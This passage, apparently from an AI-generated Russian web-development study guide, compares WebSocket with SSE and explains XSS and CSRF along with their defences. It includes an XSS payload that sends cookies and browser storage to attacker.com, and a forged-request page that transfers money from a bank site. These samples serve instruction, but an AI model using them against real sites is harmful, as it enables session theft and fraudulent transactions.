  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  
  // Отправляем пропущенные события
  if (lastEventId) {
    const missedEvents = getEventsSince(parseInt(lastEventId));
    missedEvents.forEach(event => {
      res.write(`id: ${event.id}\n`);
      res.write(`data: ${JSON.stringify(event.data)}\n\n`);
    });
  }
  
  // Продолжаем отправлять новые события
  subscribeToEvents((event) => {
    res.write(`id: ${event.id}\n`);
    res.write(`data: ${JSON.stringify(event.data)}\n\n`);
  });
});

// Client - автоматически отправляет last-event-id при переподключении
const eventSource = new EventSource('/events');
```

**Сравнение WebSocket vs SSE:**

| Характеристика | WebSocket | SSE |
|---------------|-----------|-----|
| Направление | Двунаправленный | Однонаправленный (server → client) |
| Протокол | ws:// / wss:// | HTTP/HTTPS |
| Данные | Текст и бинарные | Только текст |
| Переподключение | Ручное | Автоматическое |
| Event ID | Нет | Да |
| Совместимость | Нужен WebSocket сервер | Работает с обычным HTTP |
| HTTP/2 | Да | Да + multiplexing |
| Поддержка IE | Нет (polyfill) | Нет (polyfill) |

**Для чего:**

**WebSocket:**
- Чаты, real-time игры
- Collaborative editing
- Live trading platforms
- IoT устройства
- Когда нужна двунаправленная коммуникация

**SSE:**
- News feeds
- Notifications
- Live scores, stocks
- Progress bars для длительных операций
- Когда данные идут только от сервера

**Плюсы WebSocket:**
- Двунаправленная коммуникация
- Низкая латентность
- Бинарные данные

**Минусы WebSocket:**
- Нужен специальный сервер
- Сложнее настроить (reverse proxy, load balancer)
- Ручное переподключение
- Может блокироваться proxy/firewall

**Плюсы SSE:**
- Простота реализации
- Автоматическое переподключение
- Event ID для восстановления
- Работает через HTTP (проще с proxy)
- HTTP/2 multiplexing

**Минусы SSE:**
- Только server → client
- Только текст
- Лимит на количество открытых соединений в HTTP/1.1 (6 per domain)

**Best Practices:**

```javascript
// Используйте WebSocket когда:
// - Нужна двунаправленная коммуникация
// - Нужны бинарные данные
// - Критична низкая латентность

// Используйте SSE когда:
// - Данные идут только от сервера
// - Важна простота реализации
// - Нужно автоматическое переподключение

// Fallback strategy
if ('EventSource' in window) {
  // Use SSE
  const eventSource = new EventSource('/events');
} else if ('WebSocket' in window) {
  // Fallback to WebSocket
  const ws = new WebSocket('wss://example.com/socket');
} else {
  // Fallback to polling
  setInterval(() => {
    fetch('/api/updates').then(/* ... */);
  }, 5000);
}
```

**Альтернативы:**
- Long Polling (устаревший)
- WebRTC для peer-to-peer
- HTTP/2 Server Push (для статических ресурсов)

---

## Безопасность веб-приложений

### 7. XSS (Cross-Site Scripting) атаки и защита

**Как работает:**

XSS - это инъекция вредоносного JavaScript кода в веб-страницу, который выполняется в браузере жертвы.

**Типы XSS:**

**1. Stored XSS (Persistent):**
Вредоносный код сохраняется на сервере (БД, файлы) и выполняется у всех пользователей.

```javascript
// ❌ Уязвимый код
// Backend сохраняет comment без санитизации
app.post('/comments', (req, res) => {
  const comment = req.body.comment; // "<script>alert('XSS')</script>"
  db.comments.insert({ text: comment });
});

// Frontend отображает без экранирования
function displayComments(comments) {
  const container = document.getElementById('comments');
  comments.forEach(comment => {
    container.innerHTML += `<div>${comment.text}</div>`;
    // Скрипт выполнится!
  });
}

// Атака
const maliciousComment = `
  <img src="x" onerror="
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        cookies: document.cookie,
        localStorage: localStorage,
        sessionStorage: sessionStorage
      })
    })
  ">
`;
```

**2. Reflected XSS (Non-Persistent):**
Вредоносный код в URL параметре отражается на странице.

```javascript
// ❌ Уязвимый код
// Backend
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Результаты для: ${query}</h1>`);
});

// Атака через URL
// https://example.com/search?q=<script>alert('XSS')</script>
// https://example.com/search?q=<img src=x onerror=alert(document.cookie)>
```

**3. DOM-based XSS:**
Уязвимость в клиентском JavaScript коде.

```javascript
// ❌ Уязвимый код
const urlParams = new URLSearchParams(window.location.search);
const name = urlParams.get('name');
document.getElementById('greeting').innerHTML = `Hello, ${name}!`;

// Атака через URL
// https://example.com/page?name=<img src=x onerror=alert('XSS')>

// ❌ Другие уязвимые паттерны
eval(userInput); // НИКОГДА не используйте!
new Function(userInput)(); // НИКОГДА!
document.write(userInput);
element.innerHTML = userInput;
element.outerHTML = userInput;
element.insertAdjacentHTML('beforeend', userInput);
location.href = userInput; // javascript:alert('XSS')
```

**Защита от XSS:**

**1. Экранирование HTML (Escaping):**
```javascript
// ✅ Безопасное экранирование
function escapeHTML(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// Или вручную
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

// Использование
const userInput = '<script>alert("XSS")</script>';
const safe = escapeHTML(userInput);
container.innerHTML = safe;
// Отобразится как текст: &lt;script&gt;alert("XSS")&lt;/script&gt;
```

**2. Использование textContent вместо innerHTML:**
```javascript
// ✅ Безопасно
element.textContent = userInput;

// ❌ Опасно
element.innerHTML = userInput;

// ✅ Если нужен HTML - санитизация
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

**3. React автоматически экранирует:**
```javascript
// ✅ Безопасно - React экранирует
const userInput = '<script>alert("XSS")</script>';
return <div>{userInput}</div>;
// Отобразится как текст

// ❌ Опасно - dangerouslySetInnerHTML
return <div dangerouslySetInnerHTML={{ __html: userInput }} />;

// ✅ Безопасно с санитизацией
import DOMPurify from 'dompurify';
return (
  <div 
    dangerouslySetInnerHTML={{ 
      __html: DOMPurify.sanitize(userInput) 
    }} 
  />
);
```

**4. Content Security Policy (CSP):**
```html
<!-- Запрет inline scripts -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'">

<!-- Или через HTTP header (предпочтительно) -->
```

```javascript
// Backend (Express)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' https://cdn.example.com; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self'; " +
    "connect-src 'self' https://api.example.com; " +
    "frame-ancestors 'none'; " +
    "base-uri 'self'; " +
    "form-action 'self'"
  );
  next();
});

// CSP с nonce для inline scripts
const nonce = crypto.randomBytes(16).toString('base64');
res.setHeader(
  'Content-Security-Policy',
  `script-src 'self' 'nonce-${nonce}'`
);

// В HTML
// <script nonce="${nonce}">console.log('Safe');</script>
```

**5. Санитизация данных с DOMPurify:**
```javascript
import DOMPurify from 'dompurify';

// Базовая санитизация
const clean = DOMPurify.sanitize(dirty);

// С настройками
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOW_DATA_ATTR: false
});

// Удаление всех тегов, оставить только текст
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: [],
  KEEP_CONTENT: true
});

// Для SVG
const cleanSVG = DOMPurify.sanitize(svgString, {
  USE_PROFILES: { svg: true, svgFilters: true }
});
```

**6. Валидация и санитизация на backend:**
```javascript
// Express + validator
const { body, validationResult } = require('express-validator');

app.post('/comment',
  body('text')
    .trim()
    .isLength({ min: 1, max: 1000 })
    .escape(), // Экранирование HTML
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    
    const comment = req.body.text;
    // Дополнительная санитизация
    const clean = DOMPurify.sanitize(comment);
    
    db.comments.insert({ text: clean });
  }
);
```

**7. HttpOnly cookies для токенов:**
```javascript
// ❌ Плохо - доступ через JavaScript
document.cookie = `token=${token}; Secure; SameSite=Strict`;

// ✅ Хорошо - HttpOnly cookie (устанавливается на сервере)
res.cookie('token', token, {
  httpOnly: true,    // Нет доступа из JavaScript
  secure: true,      // Только HTTPS
  sameSite: 'strict', // CSRF защита
  maxAge: 3600000    // 1 час
});

// Токен недоступен через document.cookie
// XSS не может украсть токен!
```

**8. Защита от DOM-based XSS:**
```javascript
// ❌ Опасно
location.href = userInput;

// ✅ Безопасно - валидация URL
function isValidURL(url) {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

if (isValidURL(userInput)) {
  location.href = userInput;
}

// ❌ Опасно
element.innerHTML = `<a href="${userInput}">Link</a>`;

// ✅ Безопасно
const link = document.createElement('a');
link.textContent = 'Link';
if (isValidURL(userInput)) {
  link.href = userInput;
}
element.appendChild(link);
```

**9. Trusted Types API (современные браузеры):**
```javascript
// Политика для безопасного HTML
if (window.trustedTypes && trustedTypes.createPolicy) {
  const policy = trustedTypes.createPolicy('myPolicy', {
    createHTML: (string) => {
      return DOMPurify.sanitize(string);
    },
    createScriptURL: (string) => {
      if (string.startsWith('https://trusted-cdn.com/')) {
        return string;
      }
      throw new Error('Invalid script URL');
    }
  });
  
  // Использование
  element.innerHTML = policy.createHTML(userInput);
}
```

**Для чего:**
- Защита от кражи cookies, токенов
- Защита от defacement (изменения контента)
- Защита от keylogging
- Защита от redirect на фишинговые сайты

**Плюсы защиты:**
- Безопасность пользовательских данных
- Защита репутации
- Соответствие стандартам безопасности

**Best Practices:**
```javascript
// Checklist для защиты от XSS:

// ✅ Всегда экранируйте пользовательский ввод
// ✅ Используйте textContent вместо innerHTML где возможно
// ✅ Используйте CSP headers
// ✅ HttpOnly cookies для чувствительных данных
// ✅ Санитизация с DOMPurify для rich text
// ✅ Валидация и санитизация на backend
// ✅ Не используйте eval(), new Function()
// ✅ Валидируйте URLs перед редиректом
// ✅ Регулярные security audits
// ✅ Обновляйте зависимости (npm audit)
```

---

### 8. CSRF (Cross-Site Request Forgery) и защита

**Как работает:**

CSRF - атака, при которой злоумышленник заставляет пользователя выполнить нежелательное действие на сайте, где пользователь аутентифицирован.

**Пример атаки:**

```html
<!-- Вредоносный сайт attacker.com -->
<!DOCTYPE html>
<html>
<body>
  <!-- Вариант 1: Auto-submit form -->
  <form action="https://bank.com/transfer" method="POST" id="malicious">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="10000">
  </form>
  
  <script>
    // Автоматическая отправка формы
    document.getElementById('malicious').submit();
  </script>
  
  <!-- Вариант 2: Image tag -->
  <img src="https://bank.com/transfer?to=attacker&amount=10000">
  
  <!-- Вариант 3: Fetch (если CORS позволяет) -->
  <script>
    fetch('https://bank.com/transfer', {
      method: 'POST',
      credentials: 'include', // Отправит cookies
      body: JSON.stringify({
        to: 'attacker-account',
        amount: 10000
      })
    });
  </script>
</body>
</html>

<!-- Сценарий атаки:
1. Пользователь залогинен на bank.com (есть session cookie)
2. Пользователь переходит на attacker.com
3. Вредоносный код автоматически отправляет запрос на bank.com
4. Браузер автоматически включает cookies (session)
5. Сервер думает что это легитимный запрос от пользователя
6. Деньги переведены на счет атакующего
-->
```

**Защита от CSRF:**

**1. CSRF Token:**
```javascript
// Backend (Express + csurf)
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.use(csrfProtection);

// Отправка CSRF токена клиенту
app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// Проверка CSRF токена в POST запросе
app.post('/transfer', csrfProtection, (req, res) => {
  // csrfProtection middleware проверит токен
  // Если токена нет или он неверный - 403 Forbidden
  
  const { to, amount } = req.body;
  processTransfer(to, amount);
  res.json({ success: true });
});

// Frontend (HTML)
<form method="POST" action="/transfer">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  <input name="to" placeholder="Account">
  <input name="amount" type="number">
  <button type="submit">Transfer</button>
</form>

// Frontend (React)
function TransferForm() {
  const [csrfToken, setCsrfToken] = useState('');
  
  useEffect(() => {
    // Получаем CSRF токен
    fetch('/csrf-token')
      .then(res => res.json())
      .then(data => setCsrfToken(data.csrfToken));
  }, []);
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    await fetch('/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken // Или в теле запроса
      },
      body: JSON.stringify({ to, amount })
    });
  };
  
  return <form onSubmit={handleSubmit}>...</form>;
}
```

**2. SameSite Cookie Attribute:**
```javascript
// Backend
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict', // или 'lax', или 'none'
  maxAge: 3600000
});

/**
 * SameSite атрибуты:
 * 
 * 'strict' - Cookie отправляется только для same-site запросов
 *            (самая строгая защита)
 *            Минус: при переходе по ссылке с другого сайта пользователь
 *            будет разлогинен
 * 
 * 'lax' - Cookie отправляется для:
 *         - same-site запросов
 *         - top-level GET навигации (переход по ссылке)
 *         НЕ отправляется для:
 *         - POST запросов с другого сайта
 *         - iframe загрузок
 *         (баланс между безопасностью и удобством)
 * 
 * 'none' - Cookie отправляется для всех запросов
 *          (требует Secure attribute)
 *          Нужно для embedded контента (iframe, OAuth)
 */

// Рекомендуемые настройки:
// Для session cookie
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax', // Защита от CSRF + удобство
  maxAge: 3600000
});

// Для CSRF token cookie
res.cookie('csrf-token', csrfToken, {
  httpOnly: false, // Нужен доступ из JavaScript
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000
});
```

**3. Double Submit Cookie:**
```javascript
// Backend
app.post('/transfer', (req, res) => {
  const csrfTokenFromCookie = req.cookies['csrf-token'];
  const csrfTokenFromHeader = req.headers['x-csrf-token'];
  
  // Проверяем что токены совпадают
  if (!csrfTokenFromCookie || csrfTokenFromCookie !== csrfTokenFromHeader) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  
  // Обработка запроса
  processTransfer(req.body);
  res.json({ success: true });
});

// Frontend
function makeRequest(url, data) {
  // Читаем CSRF token из cookie
  const csrfToken = document.cookie
    .split('; ')
    .find(row => row.startsWith('csrf-token='))
    ?.split('=')[1];
  
  return fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken // Отправляем в header
    },
    credentials: 'include',
    body: JSON.stringify(data)
  });
}
```

**4. Origin/Referer Header Verification:**
```javascript
// Backend
app.post('/transfer', (req, res) => {
  const origin = req.headers.origin;
  const referer = req.headers.referer;
  
  const allowedOrigins = [
    'https://yourapp.com',
    'https://www.yourapp.com'
  ];
  
  // Проверяем origin
  if (origin && !allowedOrigins.includes(origin)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  
  // Проверяем referer (fallback если origin нет)
  if (!origin && referer) {
    const refererOrigin = new URL(referer).origin;
    if (!allowedOrigins.includes(refererOrigin)) {
      return res.status(403).json({ error: 'Invalid referer' });
    }
  }
  
  // Обработка запроса
  processTransfer(req.body);
  res.json({ success: true });
});
```

**5. Custom Request Headers:**
```javascript
// CSRF атака не может установить custom headers из-за CORS
// Поэтому наличие custom header = легитимный запрос

// Frontend
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest' // Custom header
  },
  body: JSON.stringify(data)
});

// Backend
app.post('/transfer', (req, res) => {
  // Проверяем наличие custom header
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(403).json({ error: 'Invalid request' });
  }
  
  processTransfer(req.body);
  res.json({ success: true });
});
```

**6. Confirmation для критических действий:**
```javascript
// Для критических операций требуем дополнительное подтверждение

// Frontend
async function deleteAccount() {
  const password = prompt('Enter your password to confirm:');
  
  await fetch('/api/account/delete', {
    method: 'DELETE',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({ password })
  });
}

// Или CAPTCHA для критических действий
async function transferMoney(to, amount) {
  const captchaToken = await executeCaptcha();
  
  await fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({ to, amount, captchaToken })
  });
}
```

**Комплексная защита:**
```javascript
// Backend (Express)
const express = require('express');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());
app.use(express.json());

// CSRF protection
const csrfProtection = csrf({ cookie: true });

// Middleware для проверки Origin
const checkOrigin = (req, res, next) => {
  const origin = req.headers.origin;
  const allowedOrigins = ['https://yourapp.com'];
  
  if (req.method !== 'GET' && origin && !allowedOrigins.includes(origin)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  
  next();
};

app.use(checkOrigin);

// Получение CSRF токена
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Protected endpoints
app.post('/api/transfer', csrfProtection, async (req, res) => {
  const { to, amount, password } = req.body;
  
  // Дополнительная проверка пароля для критических операций
  const user = await authenticateUser(req.user.id, password);
  if (!user) {
    return res.status(401).json({ error: 'Invalid password' });
  }
  
  await processTransfer(to, amount);
  res.json({ success: true });
});

// Frontend (React)
function App() {
  const [csrfToken, setCsrfToken] = useState('');
  
  useEffect(() => {
    fetch('/api/csrf-token', {
      credentials: 'include'
    })
      .then(res => res.json())
      .then(data => setCsrfToken(data.csrfToken));
  }, []);
  
  const apiRequest = useCallback(async (url, options = {}) => {
    return fetch(url, {
      ...options,
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
        'X-Requested-With': 'XMLHttpRequest',
        ...options.headers
      },
      credentials: 'include'
    });
  }, [csrfToken]);
  
  return (
    <ApiContext.Provider value={{ apiRequest, csrfToken }}>
      {/* App components */}
    </ApiContext.Provider>
  );
}
```

**Для чего:**
- Защита от несанкционированных действий
- Защита финансовых операций
- Защита изменения настроек аккаунта
- Защита от автоматических действий

**Плюсы защиты:**
- Предотвращение unauthorized actions
- Соответствие стандартам безопасности
- Защита пользовательских данных

**Best Practices:**
```javascript
// Checklist для защиты от CSRF:

// ✅ Используйте CSRF токены для state-changing операций
// ✅ Установите SameSite=Lax для session cookies
// ✅ Проверяйте Origin/Referer headers
// ✅ Используйте HttpOnly cookies для сессий
// ✅ Требуйте re-authentication для критических операций
// ✅ Используйте POST/PUT/DELETE для state-changing операций
// ✅ НЕ используйте GET для изменения данных
// ✅ Комбинируйте несколько методов защиты

// ❌ НЕ полагайтесь только на CORS - он не защищает от CSRF
// ❌ НЕ используйте секретные cookies как CSRF токены
// ❌ НЕ принимайте JSON в POST без CSRF защиты
```

---

Это первая часть дополнительного материала. Файл получается очень большим, поэтому я разбиваю его на части. Продолжить с остальными темами (Performance, Browser APIs, CSS, Build Tools, Testing, и т.д.)?

